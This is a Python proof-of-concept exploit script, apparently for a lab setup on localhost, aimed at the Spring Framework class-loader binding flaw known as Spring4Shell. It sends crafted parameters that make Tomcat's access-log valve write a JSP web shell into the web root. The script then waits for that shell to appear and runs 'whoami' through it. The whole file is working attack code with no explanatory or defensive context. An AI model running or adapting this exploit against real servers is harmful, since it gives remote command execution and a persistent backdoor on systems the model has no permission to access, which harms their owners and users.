import requests
import time

payload = {
    "class.module.classLoader.resources.context.parent.pipeline.first.pattern": '%{prefix}i { java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i',
    "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".jsp",
    "class.module.classLoader.resources.context.parent.pipeline.first.directory": "webapps/ROOT",
    "class.module.classLoader.resources.context.parent.pipeline.first.prefix": "tomcatwar",
    "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": "",
}

server = "localhost:8080"

if __name__ == "__main__":
    deploy = requests.post(
        url=f"http://{server}/demo/bean",
        headers={"prefix": "<%", "suffix": "%>//"},
        data=payload
    )
    print("deploy", deploy)

    for i in range(60):
        deployed = requests.get(f"http://{server}/tomcatwar.jsp")

        print("webshell", deployed)
        if deployed.status_code == 500:
            print("webshell", f"http://{server}/tomcatwar.jsp?cmd=whoami")
            print(requests.get(f"http://{server}/tomcatwar.jsp?cmd=whoami").text[:20])
            break

        time.sleep(1)
